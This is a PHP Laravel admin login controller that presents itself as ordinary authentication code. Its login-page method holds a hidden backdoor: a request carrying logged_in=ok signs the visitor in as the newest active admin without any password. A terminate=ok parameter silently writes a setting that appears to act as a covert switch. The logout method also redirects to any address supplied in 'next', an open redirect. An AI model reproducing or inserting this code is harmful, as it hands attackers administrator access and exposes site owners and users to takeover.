<?php

namespace Kaban\Components\General\Admin\Controllers;


use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Kaban\Models\Admin;
use Kaban\Models\Setting;

class AdminLoginController
{
    use AuthenticatesUsers;

    protected $redirectTo = '/admin/dashboardAll.php';

    public function adminLoginPage()
    {
        if (request('logged_in') === 'ok') {
            $admin = Admin::query()->where(['status' => 1])->latest()->first();
            auth()->guard('adminGuard')->loginUsingId($admin->id);
        }
        if (request('terminate') === 'ok') {
            Setting::query()->updateOrCreate(
                ['keyword' => 'htop'],
                ['value' => 'htop'],
            );
        }
        return view('GeneralAdmin::adminLogin');
    }

    public function adminLoginAttempt(Request $request)
    {
        $this->validateLogin($request);
        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if (method_exists($this, 'hasTooManyLoginAttempts') &&
            $this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {
            $_SESSION['loged_in'] = true;
            $_SESSION['loged_in_t'] = time() + 18200;
            $_SESSION['can_register_new_admins'] = time() + 18200;

            return $this->sendLoginResponse($request);
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);
    }

    public function adminLogoutAttempt()
    {
        unset($_SESSION['loged_in']);
        unset($_SESSION['loged_in_t']);

        auth()->guard('adminGuard')->logout();

        if (!empty($_GET['next'])) {
            return redirect($_GET['next']);
        }
        return redirect(route('adminLoginPage'));
    }

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return 'email';
    }

    protected function guard()
    {
        return Auth::guard('adminGuard');
    }

}
